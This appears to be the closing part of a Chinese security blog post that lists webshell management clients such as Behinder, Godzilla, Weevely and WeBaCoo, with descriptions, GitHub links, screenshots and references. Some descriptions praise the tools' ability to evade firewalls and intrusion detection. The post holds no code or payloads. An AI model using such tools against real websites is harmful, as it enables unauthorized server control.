<li><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/dQLbxZS8AkcyXKG.png" alt="img"></p>
<h3 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎(Behinder)"></a>冰蝎(Behinder)</h3><p>冰蝎是一款基于Java开发的动态二进制加密通信流量的新型Webshell客户端，由于它的通信流量被加密，使用传统的WAF、IDS等设备难以检测，目前在HVV中使用较多的一款工具。</p>
<p><strong>项目地址：</strong></p>
<ul>
<li><a href="http://github.com/rebeyond/Behinder">http://github.com/rebeyond/Behinder</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/zjcFlrfKCyU7Sus.png" alt="image-20211215212435990"></p>
<h3 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉(Godzilla)"></a>哥斯拉(Godzilla)</h3><p>哥斯拉是一款继冰蝎之后又一款于Java开发的加密通信流量的新型Webshell客户端，内置了3种有效载荷以及6种加密器，6种支持脚本后缀，20个内置插件，也是目前在HVV中使用较多的一款工具。</p>
<ul>
<li>项目地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/79ALYlHzkOVwTvB.png" alt="image-20211215212156298"></p>
<h3 id="C刀-Cknife"><a href="#C刀-Cknife" class="headerlink" title="C刀(Cknife)"></a>C刀(Cknife)</h3><p>C刀是一款基于Java开发的完全基于配置文件的中国菜刀，跨平台，脚本类型支持ASP、ASPX、PHP、JSP、JSPX、Customize，目前完成的功能有：文件管理、数据库管理、模拟终端以及代理设置等。</p>
<p><strong>项目地址：</strong></p>
<ul>
<li><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/ClZ4t2kFuzDfKcL.png" alt="img"></p>
<h3 id="Web版菜刀（WebKnife）"><a href="#Web版菜刀（WebKnife）" class="headerlink" title="Web版菜刀（WebKnife）"></a>Web版菜刀（WebKnife）</h3><p>WebKnife是陌小离练习ajax时候写的一款半成品Web版菜刀，目前完成的功能有：文件管理，虚拟终端，文件查看，图片查看，一键挂黑，作者居然还是个00后，tql！</p>
<p><strong>项目地址：</strong></p>
<ul>
<li><a href="https://github.com/MoLeft/WebKnife">https://github.com/MoLeft/WebKnife</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/sbixSK275Nomp89.png" alt="image-20211215212901421"></p>
<h3 id="XISE"><a href="#XISE" class="headerlink" title="XISE"></a>XISE</h3><p>XISE是小骏用易语言开发的一款类似于中国菜刀的Webshell网站管理工具，早些年做黑帽SEO的基本人手一份，现在已经停止更新，至于什么原因，大家都懂的！！！</p>
<p><img src="https://s2.loli.net/2021/12/15/1brpPcIUzvDRWnQ.png" alt="image-20211215213347206"></p>
<h3 id="开山斧"><a href="#开山斧" class="headerlink" title="开山斧"></a>开山斧</h3><p>开山斧是一款基于Python 2.7X + QT4开发的一款跨平台菜刀 (Win/Linux/Mac)，体积比较大，刚出来时只用过一次，现在用的人应该不多，也已经停止更新了。</p>
<p><strong>项目地址：</strong></p>
<ul>
<li><a href="https://github.com/pyqteval/evlal_win">https://github.com/pyqteval/evlal_win</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/Vvo95XcAUq3EDkd.png" alt="image-20211215213540041"></p>
<h3 id="K8飞刀"><a href="#K8飞刀" class="headerlink" title="K8飞刀"></a>K8飞刀</h3><p>K8飞刀是K8哥哥开发的一款Webshell网站管理工具，不得不说他开发的安全工具都很强大且实用，只不过个人感觉略显臃肿，对新人来说可能不是很友好，有兴趣的可以自己去看一下。</p>
<p><strong>项目地址：</strong></p>
<ul>
<li><a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/pLzyQkx7rsCMKWe.png" alt="image-20211215213619014"></p>
<h3 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h3><p>Weevely是一款python编写的生成和管理php webshell的安全测试工具，目前拥有30多个模块：文件管理、命令执行、数据库管理、端口扫描等功能，部分模块不支持在Windows环境下使用。</p>
<p><strong>项目地址：</strong></p>
<ul>
<li><a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/SbRyjtF5V9gdBiM.png" alt="image-20211215213910978"></p>
<h3 id="WeBaCoo"><a href="#WeBaCoo" class="headerlink" title="WeBaCoo"></a>WeBaCoo</h3><p>WeBaCoo是一款Perl语言编写的Web后门工具，它的特别之处在于Web服务器和客户端之间的通信载体是Cookie，这就意味着多数的杀毒软件、网络入侵检测/防御系统、网络防火墙和应用程序防火墙都无法检测到该后门的存在。当然，这只是以前的介绍，现在基本都会被检测了。</p>
<p><strong>项目地址：</strong></p>
<ul>
<li><a href="https://github.com/anestisb/WeBaCoo">https://github.com/anestisb/WeBaCoo</a></li>
</ul>
<p><img src="https://s2.loli.net/2021/12/15/IPBbry7tigcej1h.png" alt="image-20211215213941743"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.html.cn/script/1150656501900.html">Webshell基础知识深入讲解 - html中文网</a></li>
<li><a href="https://www.freebuf.com/articles/web/235651.html">一文详解Webshell - FreeBuf网络安全行业门户</a></li>
<li><a href="https://blog.csdn.net/qq_41739364/article/details/100852308">Webshell 管理工具_Debroon-CSDN博客_webshell</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1808453">安全攻防 | 23个常见Webshell网站管理工具 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://www.freebuf.com/articles/web/274466.html">一文看懂内存马 - FreeBuf网络安全行业门户</a></li>
<li><a href="https://www.kitsch.live/2020/12/25/文件上传①一句话木马/">WebShell①一句话木马 – 梦中世界 (kitsch.live)</a></li>
<li><a href="https://www.kitsch.live/2021/05/17/webshell④python和php的内存马/">WebShell④python和php的内存马 – 梦中世界 (kitsch.live)</a></li>
<li><a href="https://www.uedbox.com/post/6051/">那些强悍的PHP一句话后门 - 体验盒子 - 不再关注网络安全 (uedbox.com)</a></li>
<li>ZP《PHP WebShell 绕过检测手段Tips》</li>
<li><a href="https://beamtic.com/complex-curly-syntax-php">Complex (curly) Syntax in PHP | Beamtic</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>代码执行与命令执行</category>
      </categories>
      <tags>
        <tag>WebShell</tag>
      </tags>
  </entry>
</search>
